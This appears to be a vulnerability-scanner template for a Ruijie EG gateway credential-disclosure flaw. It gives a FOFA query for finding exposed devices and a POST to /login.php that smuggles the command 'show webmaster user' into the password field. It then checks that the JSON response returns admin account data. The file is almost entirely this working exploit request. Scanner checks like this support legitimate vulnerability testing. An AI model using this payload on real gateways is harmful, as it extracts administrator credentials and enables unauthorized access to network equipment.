id: ruijie-eg-password-leak

info:
  name: Ruijie EG Information Disaclosure
  author: Search?=Null
  severity: high
  verified: true
  description: |-
    fofa: app="Ruijie-EG易网关"
  tags: ruijie,disclosure
  created: 2023/10/29

rules:
  r0:
    request:
      method: POST
      path: /login.php
      body: |
        username=admin&password=admin?show+webmaster+user
    expression: |
      response.status == 200 &&
      response.content_type.contains("text/json") &&
      response.body.bcontains(b'"data":"') &&
      response.body.bcontains(b'"status":') &&
      '"data":".*admin'.bmatches(response.body)
expression: r0()
